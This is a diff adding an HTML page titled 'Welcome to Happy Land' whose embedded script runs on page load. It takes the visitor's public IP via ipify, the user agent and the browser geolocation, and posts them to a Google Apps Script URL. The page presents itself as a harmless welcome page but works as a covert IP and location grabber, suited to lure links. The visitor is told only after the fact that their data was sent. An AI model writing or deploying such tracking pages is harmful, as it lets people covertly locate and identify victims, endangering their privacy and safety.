@@ -1,0 +1,56 @@
+<html>
+<head>
+    <title>Welcome to Happy Land</title>
+</head>
+<body>
+    <h1>Welcome to Happy Land</h1>
+    <p>Your information has been recorded and sent to the Google Drive document.</p>
+    <script>
+        // Function to send data to Google Apps Script
+        function sendDataToGoogleAppsScript(data) {
+            const scriptUrl = 'https://script.google.com/macros/s/AKfycbwGS4tdhA8zn_e8NJ7isUuuGq6dceMmLDDEYVmmn1SE1JfAHYytJKrKjHBmzpJlC4lGQQ/exec';
+            const request = new XMLHttpRequest();
+            request.open('POST', scriptUrl, true);
+            request.setRequestHeader('Content-Type', 'application/json');
+            request.onload = function() {
+                console.log('Data sent to Google Apps Script:', request.responseText);
+            };
+            request.send(JSON.stringify(data));
+        }
+
+        // Function to get user's geolocation
+        function getGeolocation(callback) {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(function(position) {
+                    callback(position.coords.latitude, position.coords.longitude);
+                });
+            } else {
+                console.log('Geolocation is not supported by this browser.');
+                callback(null, null);
+            }
+        }
+
+        // Function to get user's IP and user agent
+        async function getUserInfo() {
+            const ipResponse = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipResponse.json();
+            const ip = ipData.ip;
+
+            const userAgent = navigator.userAgent;
+
+            getGeolocation(function(latitude, longitude) {
+                const data = {
+                    ip: ip,
+                    userAgent: userAgent,
+                    latitude: latitude,
+                    longitude: longitude
+                };
+                sendDataToGoogleAppsScript(data);
+            });
+        }
+
+        // Call the function to get user's information
+        getUserInfo();
+    </script>
+</body>
+</html>
